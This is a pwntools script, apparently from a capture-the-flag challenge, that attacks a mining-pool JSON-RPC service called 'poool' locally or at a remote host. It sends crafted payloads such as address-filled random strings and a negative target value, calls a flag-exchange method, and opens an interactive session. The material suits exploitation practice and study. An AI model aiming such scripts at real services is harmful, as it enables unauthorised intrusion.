#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import json
import time, random, string

context.log_level="debug"
pwn_file="./poool"
os.environ["LD_LIBRARY_PATH"]="./"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def o_subscribe(ids, params):
    l = json.dumps({"id":ids, "method":"mining.subscribe", "params":params})
    r.sendline(l)
    res = json.loads(r.recvuntil("}"))
    return res["result"]

def o_authorize(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.authorize", "params":params}))
    res = json.loads(r.recvuntil("}"))
    dif = json.loads(r.recvuntil("}"))
    notify = json.loads(r.recvuntil("}"))
    return notify["params"]

def o_ping(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.ping", "params":params}))
    return r.recvuntil("}")

def o_submit(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.submit", "params":params}))
    return r.recvuntil("}")

def o_suggest_target(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.suggest_target", "params":params}))
    res = json.loads(r.recvuntil("}"))
    dif = json.loads(r.recvuntil("}"))
    notify = json.loads(r.recvuntil("}"))
    return notify["params"]
    
def o_speed(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.speed", "params":params}))
    return r.recvuntil("}")

def o_share(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.share", "params":params}))
    return r.recvuntil("}")

def o_balance(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.balance", "params":params}))
    return r.recvuntil("}")

def o_flag(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.exchange.flag", "params":params}))
    return json.loads(r.recvuntil("}"))["result"]

def fuzz(dic):
    r.sendline(json.dumps(dic))

class random_str:
    def __mul__(self,length):
        if length%8 == 0:
            ret="".join([p64(randint(0x7f56ecd12000,0x7f56ecd52000)) for _ in range(length/8)])
        elif length%4 == 0:
            ret="".join([p32(randint(0x400000,0x604000)) for _ in range(length/4)])
        else:
            ret="".join([chr(randint(0,0xff)) for _ in range(length)])
        ret=ret.replace("\n","\x01")
        return ret

A=random_str()


o_subscribe(0,[])
ret=o_authorize(0,["oO0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"])
o_share(0,[])

for i in range(0x10):
    ret=o_suggest_target(0,["-2"])
    job=int(ret[0],16)
    o_submit(0,["a",job,(A*4).encode("hex"),(A*4).encode("hex")])

r.interactive()
